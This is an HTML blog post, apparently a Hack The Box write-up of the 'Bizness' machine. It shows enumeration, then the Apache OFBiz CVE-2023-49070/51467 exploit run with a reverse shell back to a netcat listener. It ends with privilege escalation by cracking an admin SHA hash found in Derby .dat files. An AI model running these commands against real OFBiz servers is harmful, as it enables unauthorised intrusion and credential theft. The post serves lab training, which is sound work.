@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>HTB Bizness Guide</title>
+  <link rel="stylesheet" href="/static/css/styles.css"/>
+</head>
+<body>
+  <div class="container">
+    <header class="post-header">
+      <h1>HTB Bizness Guide</h1>
+      <div class="post-meta">
+        <span class="date">2024-04-21</span> —
+        <span class="tags"><span class="tag">HTB</span><span class="tag">OFBiz</span><span class="tag">CVE</span><span class="tag">Derby</span></span>
+      </div>
+      <img class="post-banner" src="/static/images/htb_bizness_guide_1.png" alt="Imagem do post"/>
+    </header>
+    <article class="post-body">
+      <p>Bizness is a Hack The Box machine that involves exploiting vulnerabilities in Apache OFBiz, specifically CVE-2023-49070 and CVE-2023-51467. These vulnerabilities allow for remote code execution, granting attackers access to the system. Once inside, privilege escalation is achieved by cracking an exposed hash found in .dat files within the Derby database.</p>
+<h1>Nmap Scan</h1>
+<p>Let's start with a simple nmap scan on the top 1000 ports.</p>
+<pre><code class="language-nmap">┌──(kali㉿atropos)-[~]
+└─$ sudo nmap 10.10.11.252 -sV
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-21 13:24 EDT
+Nmap scan report for bizness.htb (10.10.11.252)
+Host is up (0.16s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+80/tcp  open  http     nginx 1.18.0
+443/tcp open  ssl/http nginx 1.18.0
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.54 seconds
+</code></pre>
+<p>Here we can see that there is a web server running on the 80/443 ports, so we can navigate to the web page and see what's there, but before we can do that, we must add the bizness.htb to the /etc/hosts file so we can access it.</p>
+<pre><code>┌──(kali㉿atropos)-[~]
+└─$ cat /etc/hosts   
+127.0.0.1       localhost
+127.0.1.1       atropos
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+
+10.10.11.252 bizness.htb
+</code></pre>
+<h1>Initial analysis</h1>
+<p>Looking in the site, we can see a home page for some kind of corporation:
+<img alt="General/HackTheBox/Machines/2024 Active machines/att/Bizness_homepage.png" src="/static/images/htb_bizness_guide_2.png"/>
+The input forms don't seam to be vulnerable to SQL injection or something among those lines, so, let's enumerate further the web application.</p>
+<h2>FFUF (Web directory enumeration)</h2>
+<pre><code>┌──(kali㉿atropos)-[~]
+└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u https://bizness.htb/FUZZ/FUZZ -mc 200
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://bizness.htb/FUZZ/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200
+________________________________________________
+
+#                       [Status: 200, Size: 27200, Words: 9218, Lines: 523, Duration: 187ms]
+# Copyright 2007 James Fisher [Status: 200, Size: 27200, Words: 9218, Lines: 523, Duration: 188ms]
+# This work is licensed under the Creative Commons  [Status: 200, Size: 27200, Words: 9218, Lines: 523, Duration: 192ms]
+# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 27200, Words: 9218, Lines: 523, Duration: 187ms]
+# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 27200, Words: 9218, Lines: 523, Duration: 192ms]
+# directory-list-1.0.txt [Status: 200, Size: 27200, Words: 9218, Lines: 523, Duration: 187ms]
+#                       [Status: 200, Size: 27200, Words: 9218, Lines: 523, Duration: 185ms]
+# Unordered case sensative list, where entries were found  [Status: 200, Size: 27200, Words: 9218, Lines: 523, Duration: 191ms]
+#                       [Status: 200, Size: 27200, Words: 9218, Lines: 523, Duration: 181ms]
+# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 27200, Words: 9218, Lines: 523, Duration: 197ms]
+# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 27200, Words: 9218, Lines: 523, Duration: 196ms]
+#                       [Status: 200, Size: 27200, Words: 9218, Lines: 523, Duration: 198ms]
+                        [Status: 200, Size: 27200, Words: 9218, Lines: 523, Duration: 183ms]
+# on atleast 2 host.  This was the first draft of the list. [Status: 200, Size: 27200, Words: 9218, Lines: 523, Duration: 188ms]
+control                 [Status: 200, Size: 34636, Words: 10468, Lines: 492, Duration: 227ms]
+</code></pre>
+<p>Here we can see the control page, so let's go there and see what is there on that page:
+<img alt="ofbiz_error.png" src="/static/images/htb_bizness_guide_3.png"/>
+That is a good thing, now we know that the target is running Apache OFBiz, so we can start to search for some possible vulnerability. Since this is an OFBiz we can navigate to https://bizness.htb/control/login, in the bottom right corner we can find the version of OFBiz. Searching that version, we can find 2 possible vulnerabilities:</p>
+<blockquote>
+<p>Pre-auth RCE in Apache Ofbiz 18.12.09. It's due to XML-RPC no longer maintained still present. This issue affects Apache OFBiz: before 18.12.10.  Users are recommended to upgrade to version 18.12.10
+<a href="https://nvd.nist.gov/vuln/detail/CVE-2023-49070">https://nvd.nist.gov/vuln/detail/CVE-2023-49070</a></p>
+<p>The vulnerability permits attackers to circumvent authentication processes, enabling them to remotely execute arbitrary code
+<a href="https://nvd.nist.gov/vuln/detail/CVE-2023-51467">https://nvd.nist.gov/vuln/detail/CVE-2023-51467</a></p>
+</blockquote>
+<p>Remote code execution is the exploit that we need.</p>
+<h1>Gaining Access</h1>
+<p>On <a href="https://github.com/UserConnecting/Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz">GitHub</a> we can find a simple exploit written on Python, made by <a href="https://github.com/UserConnecting">UserConnecting</a>. The code is very well written, I would really recommend reading it if you want to understand the exploit in details. But to use if, we just need to set a netcat listener and execute the shell on the exploit:</p>
+<pre><code>┌──(kali㉿atropos)-[~/htb]
+└─$ nc -lvnp 8002
+listening on [any] 8002 ...
+</code></pre>
+<pre><code>┌──(kali㉿atropos)-[~/htb]
+└─$ python3 ofbiz_exploit.py https://bizness.htb shell 10.10.14.135:8002
+The target appears to be vulnerable.
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+[?] It is not possible to be certain of success. The target may not be truly vulnerable. [?]
+Check if the reverse shell was established or if there is any command output.
+</code></pre>
+<p>Once the exploit is done running we can see that we got a reverse shell back on the netcat. Now is recommendable to spawn a full shell out of the netcat, we can do this by doing the following:</p>
+<pre><code class="language-shell">python3 -c 'import pty;pty.spawn("/bin/bash")'
+CTRL+Z
+stty raw -echo;fg
+export TERM=xterm
+</code></pre>
+<p>Now we can proceed to get your user flag:</p>
+<pre><code>ofbiz@bizness:~$ pwd
+/home/ofbiz
+ofbiz@bizness:~$ ls
+user.txt
+ofbiz@bizness:~$ 
+</code></pre>
+<h1>Privilege Escalation</h1>
+<h2>A possible approach</h2>
+<p>Now for privilege escalation, it's a troubling part, my first try on privilege escalation is a <code>sudo -l</code> that has no effect on that machine, so, the next step is <a href="https://github.com/peass-ng/PEASS-ng">linpeas</a>, there is an interesting output:</p>
+<pre><code>╔══════════╣ Analyzing .service files
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                                                 
+/etc/systemd/system/multi-user.target.wants/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew                                           
+/etc/systemd/system/multi-user.target.wants/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
+/etc/systemd/system/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
+/etc/systemd/system/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
+You can't write on systemd PATH
+</code></pre>
+<p>If we cat the <code>/etc/systemd/system/multi-user.target.wants/ofbiz.service</code> we can see this:</p>
+<pre><code>ofbiz@bizness:~$ cat /etc/systemd/system/multi-user.target.wants/ofbiz.service
+# OFBiz service
+
+[Unit]
+Description=OFBiz Service
+
+[Service]
+Type=simple
+
+# environment variables
+Environment="JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64"
+Environment="PATH=/usr/lib/jvm/java-11-openjdk-amd64/bin:/bin:/sbin:/usr/bin:/usr/sbin"
+
+User=ofbiz
+WorkingDirectory=/opt/ofbiz
+
+# start and stop executables
+# note that systemd requires specifying full/absolute path to executables
+ExecStart=/opt/ofbiz/gradlew ofbiz
+ExecStop=/opt/ofbiz/gradlew "ofbiz --shutdown"
+
+Restart=Always
+RestartSec=10s
+RemainAfterExit=no
+
+[Install]
+WantedBy=multi-user.target
+</code></pre>
+<p>The <code>Restart=Always</code> parameter on the service ensures that the service is restarted no matters how the service was stopped, and the <code>RestartSec=10s</code> parameters ensures that the service will wait 10 seconds before it restarts. So, as we can see, the <code>gradlew</code> executable is executed on start <code>ExecStart=/opt/ofbiz/gradlew ofbiz</code>.</p>
+<p>So, theoretically we can use this to escalate your privileges, we can add a reverse shell on that file and find a way to restart/stop the service, once it comes back on we will have your shell. BUT, the problem is, there is no way (at least that a tried at the moment) to restart the service.</p>
+<h2>A common approach</h2>
+<p>Navigating on the ofbiz directory, there is a derby folder, <a href="https://db.apache.org/derby/#What+is+Apache+Derby%3F">derby</a> is an open source relational database implemented entirely in Java. To find something useful we can grep all the .dat files for an "SHA" string, that way we can find files that are worth looking:</p>
+<pre><code>ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$ grep -lR "SHA" 
+c5490.dat
+c54a1.dat
+c54d0.dat
+c10.dat
+c6650.dat
+c1330.dat
+</code></pre>
+<p>On the file <code>c54d0.dat</code> we can find this:</p>
+<pre><code>ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$ cat c54d0.dat
+v��������Pt�
+           �@3��R� �u   �T�U�8501A���&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+            &lt;ofbiz-ser&gt;
+                &lt;map-HashMap&gt;
+                    &lt;map-Entry&gt;
+                        &lt;map-Key&gt;
+                            &lt;std-String value="recurrenceInfoId"/&gt;
+                        &lt;/map-Key&gt;
+                        &lt;map-Value&gt;
+                            &lt;std-String value="400"/&gt;
+                        &lt;/map-Value&gt;
+                    &lt;/map-Entry&gt;
+                &lt;/map-HashMap&gt;
+            &lt;/ofbiz-ser&gt;
+
+        �
+         'O��
+             �
+              '��
+                 �
+                  'O��
+                      �
+                       '�10000CO�J&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;ofbiz-ser&gt;
+    &lt;map-HashMap&gt;
+        &lt;map-Entry&gt;
+            &lt;map-Key&gt;
+                &lt;std-String value="updatedUserLogin"/&gt;
+            &lt;/map-Key&gt;
+            &lt;map-Value&gt;
+                &lt;eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/&gt;
+
+&lt;SNIP&gt;
+</code></pre>
+<p>There we have a <code>$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I</code>, we can now try to crack that hash and get a possible password for root access. But first we need to convert that hash to a standard format. For that, we can use <a href="https://gchq.github.io/CyberChef/">CyberChef</a>, first let's pull a <code>From Base64</code> and then a <code>to Hex</code>:
+<img alt="CyberChef.png" src="/static/images/htb_bizness_guide_4.png"/>
+Then we can proceed to hashcat to crack that hash:</p>
+<pre><code>┌──(kali㉿atropos)-[~/htb]
+└─$ hashcat -a 0 -m 120 hash /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-sandybridge-Intel(R) Core(TM) i5-9400F CPU @ 2.90GHz, 2918/5901 MB (1024 MB allocatable), 6MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimim salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 1 MB
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt                                                                                                              
+* Passwords.: 14344392                                                                                                                                      
+* Bytes.....: 139921507                                                                                                                                     
+* Keyspace..: 14344385                                                                                                                                      
+* Runtime...: 2 secs                                                                                                                                        
+
+b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness  
+</code></pre>
+<p>So <code>monkeybizness</code> is a password we can try to get on root:</p>
+<pre><code>ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$ su
+Password: 
+root@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0# cd /root
+root@bizness:~# ls
+root.txt
+root@bizness:~# 
+</code></pre>
+    </article>
+  </div>
+</body>
+</html>
